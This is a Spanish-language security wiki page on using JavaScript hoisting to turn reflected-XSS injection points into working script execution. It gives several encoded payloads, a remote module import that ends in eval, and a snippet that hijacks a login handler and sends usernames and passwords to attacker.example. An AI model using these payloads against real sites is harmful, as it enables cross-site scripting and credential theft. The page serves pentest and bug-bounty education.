# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Información básica

En el lenguaje JavaScript, existe un mecanismo conocido como **Hoisting** donde las declaraciones de variables, funciones, clases o imports se conceptualizan como elevadas al inicio de su scope antes de que el código se ejecute. Este proceso lo realiza automáticamente el motor de JavaScript, que recorre el script en múltiples pasadas.

Durante la primera pasada, el engine parsea el código para comprobar errores de sintaxis y lo transforma en un abstract syntax tree. Esta fase incluye el hoisting, un proceso donde ciertas declaraciones se mueven al inicio del execution context. Si la fase de parsing tiene éxito, indicando que no hay errores de sintaxis, la ejecución del script continúa.

Es crucial entender que:

1. El script debe estar libre de errores de sintaxis para que ocurra la ejecución. Las reglas de sintaxis deben cumplirse estrictamente.
2. La colocación del código dentro del script afecta la ejecución debido al hoisting, aunque el código ejecutado pueda diferir de su representación textual.

#### Tipos de Hoisting

Basado en la información de MDN, existen cuatro tipos distintos de hoisting en JavaScript:

1. **Value Hoisting**: Permite el uso del valor de una variable dentro de su scope antes de su línea de declaración.
2. **Declaration Hoisting**: Permite referenciar una variable dentro de su scope antes de su declaración sin provocar un `ReferenceError`, pero el valor de la variable será `undefined`.
3. Este tipo altera el comportamiento dentro de su scope debido a que la declaración de la variable ocurre antes de su línea de declaración real.
4. Los efectos secundarios de la declaración ocurren antes de que el resto del código que la contiene sea evaluado.

En detalle, las declaraciones de función exhiben comportamiento de hoisting tipo 1. La palabra clave `var` demuestra comportamiento tipo 2. Las declaraciones léxicas, que incluyen `let`, `const` y `class`, muestran comportamiento tipo 3. Por último, las declaraciones `import` son únicas en que son hoisted con comportamientos tanto de tipo 1 como de tipo 4.

## Escenarios

Por lo tanto, si tienes escenarios donde puedes **Inject JS code after an undeclared object** se usa, podrías **fix the syntax** declarándolo (así tu código se ejecuta en lugar de lanzar un error):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Más escenarios
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting para evitar el manejo de excepciones

Cuando el sink está envuelto en un `try { x.y(...) } catch { ... }`, **ReferenceError** detendrá la ejecución antes de que se ejecute tu payload. Puedes declarar previamente el identificador faltante para que la llamada sobreviva y tu expresión inyectada se ejecute primero:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` se eleva (hoisted) antes de la evaluación, por lo que el parser ya no lanza un error en `x.y(...)`; `prompt()` se ejecuta antes de que `y` se resuelva, y luego se lanza un `TypeError` después de que tu código se haya ejecutado.

### Adelántate a declaraciones posteriores bloqueando un nombre con const

Si puedes ejecutar antes de que se analice una `function foo(){...}` a nivel superior, declarar un enlace léxico con el mismo nombre (p. ej., `const foo = ...`) impedirá que la declaración de función posterior reasigne ese identificador. Esto puede abusarse en RXSS para secuestrar manejadores críticos definidos más adelante en la página:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Notas
- Esto depende del orden de ejecución y del ámbito global (nivel superior).
- Si tu payload se ejecuta dentro de `eval()`, recuerda que `const/let` dentro de `eval` tienen ámbito de bloque y no crearán enlaces globales. Inyecta un nuevo elemento `<script>` con el código para establecer un `const` verdaderamente global.

### import() dinámico con especificadores controlados por el usuario

Las aplicaciones renderizadas del lado del servidor a veces reenvían la entrada del usuario a `import()` para cargar componentes de forma diferida. Si un loader como `import-in-the-middle` está presente, se generan módulos wrapper a partir del specifier. La evaluación hoisted de `import` obtiene y ejecuta el módulo controlado por el atacante antes de que se ejecuten las líneas siguientes, posibilitando RCE en contextos SSR (ver CVE-2023-38704).

### Herramientas

Los scanners modernos empezaron a añadir payloads explícitos de hoisting. **KNOXSS v3.6.5** lista los casos de prueba "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" y "Hoisting Override"; ejecutarlo contra contextos RXSS que lanzan `ReferenceError`/`TypeError` hace aflorar rápidamente candidatos a gadgets basados en hoist.

## Referencias

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
